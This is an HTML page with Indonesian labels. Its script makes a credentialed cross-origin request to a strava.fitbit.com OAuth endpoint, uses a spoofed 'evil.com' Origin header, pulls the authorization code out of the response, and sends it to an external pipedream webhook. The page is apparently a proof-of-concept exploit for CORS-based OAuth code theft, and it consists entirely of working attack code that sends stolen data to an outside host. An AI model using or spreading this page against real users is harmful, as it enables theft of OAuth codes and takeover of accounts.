<!DOCTYPE html>
<html>
<head>
  <title>Ambil kode OAuth dari strava.fitbit.com</title>
</head>
<body>
  <h2>Ambil kode OAuth dari strava.fitbit.com</h2>
  <div id="output">Memulai...</div>

  <script>
    const endpoint = 'https://strava.fitbit.com/auth/fitbit';
    const webhook = 'https://eoqb3e0qi0vy2sc.m.pipedream.net';

    fetch(endpoint, {
      method: 'GET',
      credentials: 'include',
      mode: 'cors',
      headers: {
        'Origin': 'https://evil.com'
      }
    })
    .then(response => response.text())
    .then(text => {
      const codeMatch = text.match(/code=([a-zA-Z0-9\-_]+)/);
      if (codeMatch) {
        const code = codeMatch[1];
        document.getElementById('output').innerText = `✅ Kode berhasil diambil: ${code}`;

        // Kirim ke pipedream
        fetch(webhook, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ oauth_code: code })
        });
      } else {
        document.getElementById('output').innerText = "⚠️ Tidak menemukan kode di response.";
      }
    })
    .catch(err => {
      document.getElementById('output').innerText = `ERROR: ${err}`;
    });
  </script>
</body>
</html>

